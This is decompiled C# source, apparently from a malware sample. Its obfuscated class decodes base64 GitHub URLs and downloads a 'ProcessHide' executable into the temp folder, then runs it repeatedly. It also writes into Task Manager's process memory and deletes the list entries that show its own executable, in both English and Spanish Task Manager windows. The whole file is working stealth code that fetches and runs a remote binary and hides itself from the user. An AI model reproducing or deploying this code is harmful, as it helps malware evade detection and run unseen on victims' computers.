using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace MufMaOSvGyvz
{
	// Token: 0x02000019 RID: 25
	internal class ClassDown
	{
		// Token: 0x0600006D RID: 109
		public static string DownloadHideProcess()
		{
			if (IntPtr.Size == 8)
			{
				MainCore.idAGkbKivQU = ClassDown.Down(new Uri(MainCore.DecodeBase64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
				// -> https://raw.githubusercontent.com/d35ha/ProcessHide/master/bins/ProcessHide64.exe
			}
			else
			{
				MainCore.idAGkbKivQU = ClassDown.Down(new Uri(MainCore.DecodeBase64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
				// -> https://raw.githubusercontent.com/d35ha/ProcessHide/master/bins/ProcessHide32.exe
			}
			return MainCore.idAGkbKivQU;
		}

		// Token: 0x0600006E RID: 110
		public static string Down(Uri uri_0)
		{
			try
			{
				string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
				return Path.Combine(Path.GetTempPath(), path);
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x0600006F RID: 111
		public static Process CheckProcess(string string_0)
		{
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.Contains(string_0))
				{
					return process;
				}
			}
			return null;
		}

		// Token: 0x06000070 RID: 112
		public static void Hide(string[] string_0)
		{
			string text = ClassDown.DownloadHideProcess();
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			for (;;)
			{
				foreach (string string_ in string_0)
				{
					Process process = ClassDown.CheckProcess(string_);
					if (process != null)
					{
						string str = process.Id.ToString();
						MainCore.CreateProcess(text, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));
						MainCore.CreateProcess(text, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + " *32");
					}
				}
				Thread.Sleep(200);
			}
		}

		// Token: 0x06000071 RID: 113
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

		// Token: 0x06000072 RID: 114
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

		// Token: 0x06000073 RID: 115
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

		// Token: 0x06000074 RID: 116
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CloseHandle(IntPtr hpVveBdaWnIOYwwXL);

		// Token: 0x06000075 RID: 117
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr lwnhiHQymS, IntPtr MVXdKsATqXjz, byte[] bkwmIIPdfbtubjzt, uint vfujrsmJYTYOJ, out UIntPtr VPgzioQLDTipZa);

		// Token: 0x06000076 RID: 118
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool ReadProcessMemory(IntPtr cnKjHptFUVK, IntPtr mVxmaCVnaXkzH, [Out] byte[] kIhITkZndbo, int DBnBUzxFnURa, out UIntPtr LukJReEMLTi);

		// Token: 0x06000077 RID: 119
		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr uAVwxRJcBfGrC, out uint DcJpBfTnaufiPjJ);

		// Token: 0x06000078 RID: 120
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

		// Token: 0x06000079 RID: 121
		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr FindWindow(string string_0, string string_1);

		// Token: 0x0600007A RID: 122
		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

		// Token: 0x0600007B RID: 123
		private static byte[] CopyStructure(object object_0)
		{
			int num = Marshal.SizeOf(object_0);
			byte[] array = new byte[num];
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			Marshal.StructureToPtr(object_0, intPtr, true);
			Marshal.Copy(intPtr, array, 0, num);
			Marshal.FreeHGlobal(intPtr);
			return array;
		}

		// Token: 0x0600007C RID: 124
		private static IntPtr ChoseOpenProcess(uint uint_0)
		{
			return ClassDown.OpenProcess(56, false, uint_0);
		}

		// Token: 0x0600007D RID: 125
		private static void CloseTheHandle(IntPtr intptr_0)
		{
			ClassDown.CloseHandle(intptr_0);
		}

		// Token: 0x0600007E RID: 126
		private static IntPtr Allocate(uint uint_0, IntPtr intptr_0)
		{
			return ClassDown.VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
		}

		// Token: 0x0600007F RID: 127
		private static void Free(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
		{
			ClassDown.VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
		}

		// Token: 0x06000080 RID: 128
		private static IntPtr CheckTaskManager()
		{
			IntPtr intPtr = ClassDown.FindWindow("TaskManagerWindow", "Administrador de tareas"); //-> in Spanish : Task Manager
			if (intPtr == IntPtr.Zero)
			{
				intPtr = ClassDown.FindWindow("#32770", "Task Manager");
				intPtr = ClassDown.FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
				intPtr = ClassDown.FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
			}
			else
			{
				intPtr = ClassDown.FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
				intPtr = ClassDown.FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
			}
			return intPtr;
		}

		// Token: 0x06000081 RID: 129
		private static IntPtr PushMessage(IntPtr intptr_0)
		{
			return ClassDown.SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
		}

		// Token: 0x06000082 RID: 130
		private static void PushMessage3(IntPtr intptr_0, IntPtr intptr_1)
		{
			ClassDown.SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
		}

		// Token: 0x06000083 RID: 131
		private static void PushMessage2(IntPtr intptr_0)
		{
			ClassDown.SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
		}

		// Token: 0x06000084 RID: 132
		private static string InitAllocate(IntPtr intptr_0, IntPtr intptr_1)
		{
			byte[] array = new byte[50];
			ClassDown.dKbHtpDNcyBx dKbHtpDNcyBx = default(ClassDown.dKbHtpDNcyBx);
			uint uint_;
			ClassDown.GetWindowThreadProcessId(intptr_0, out uint_);
			IntPtr intPtr = ClassDown.ChoseOpenProcess(uint_);
			IntPtr intPtr2 = ClassDown.Allocate((uint)Marshal.SizeOf<ClassDown.dKbHtpDNcyBx>(dKbHtpDNcyBx), intPtr);
			IntPtr intPtr3 = ClassDown.Allocate(50u, intPtr);
			dKbHtpDNcyBx.TJgUaBOUBT = intptr_1;
			dKbHtpDNcyBx.VSUSauiToCtS = (IntPtr)0;
			dKbHtpDNcyBx.SHlkcsOkGpZs = 50u;
			dKbHtpDNcyBx.wXxIWQZbNvLd = intPtr3;
			UIntPtr uintPtr;
			ClassDown.WriteProcessMemory(intPtr, intPtr2, ClassDown.CopyStructure(dKbHtpDNcyBx), (uint)Marshal.SizeOf<ClassDown.dKbHtpDNcyBx>(dKbHtpDNcyBx), out uintPtr);
			ClassDown.SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
			ClassDown.ReadProcessMemory(intPtr, intPtr3, array, 50, out uintPtr);
			ClassDown.Free(intPtr, intPtr2, (uint)Marshal.SizeOf<ClassDown.dKbHtpDNcyBx>(dKbHtpDNcyBx));
			ClassDown.Free(intPtr, intPtr3, 50u);
			ClassDown.CloseTheHandle(intPtr);
			return Encoding.ASCII.GetString(array);
		}

		// Token: 0x06000085 RID: 133
		private static void Check(string string_0)
		{
			IntPtr intPtr = ClassDown.CheckTaskManager();
			if (intPtr != IntPtr.Zero)
			{
				int num = (int)ClassDown.PushMessage(intPtr);
				for (int i = 0; i < num; i++)
				{
					string text = ClassDown.InitAllocate(intPtr, (IntPtr)i);
					if (text.Contains(string_0))
					{
						ClassDown.PushMessage3(intPtr, (IntPtr)i);
					}
				}
			}
		}

		// Token: 0x06000086 RID: 134
		private static void PushmessageData()
		{
			IntPtr intPtr = ClassDown.CheckTaskManager();
			if (intPtr != IntPtr.Zero)
			{
				ClassDown.PushMessage2(intPtr);
				ClassDown.PushMessage2(intPtr);
				ClassDown.PushMessage2(intPtr);
				ClassDown.PushMessage2(intPtr);
				ClassDown.PushMessage2(intPtr);
			}
		}

		// Token: 0x06000087 RID: 135
		public static void NewProcess()
		{
			Thread thread = new Thread(new ThreadStart(ClassDown.Verify));
			thread.Start();
		}

		// Token: 0x06000088 RID: 136
		private static void Verify()
		{
			while (!ClassDown.wyfMfGMephQYv)
			{
				if (ClassDown.MBcnWmpVGoY)
				{
					ClassDown.Check(Process.GetCurrentProcess().ProcessName + ".exe");
					Thread.Sleep(525);
				}
				else
				{
					ClassDown.PushmessageData();
					Thread.Sleep(1000);
				}
			}
			ClassDown.wyfMfGMephQYv = false;
		}

		// Token: 0x04000069 RID: 105
		private static volatile bool wyfMfGMephQYv = false;

		// Token: 0x0400006A RID: 106
		public static volatile bool MBcnWmpVGoY = true;

		// Token: 0x0200001A RID: 26
		private struct dKbHtpDNcyBx
		{
			// Token: 0x0400006B RID: 107
			public uint laPFOpqrWXuj;

			// Token: 0x0400006C RID: 108
			public IntPtr TJgUaBOUBT;

			// Token: 0x0400006D RID: 109
			public IntPtr VSUSauiToCtS;

			// Token: 0x0400006E RID: 110
			public uint ZgoSmFztkCuP;

			// Token: 0x0400006F RID: 111
			public uint HOTinmJKMbJDIGg;

			// Token: 0x04000070 RID: 112
			public IntPtr wXxIWQZbNvLd;

			// Token: 0x04000071 RID: 113
			public uint SHlkcsOkGpZs;

			// Token: 0x04000072 RID: 114
			public int JLQNzdehnuTU;

			// Token: 0x04000073 RID: 115
			public IntPtr rruYURRPeG;
		}
	}
}
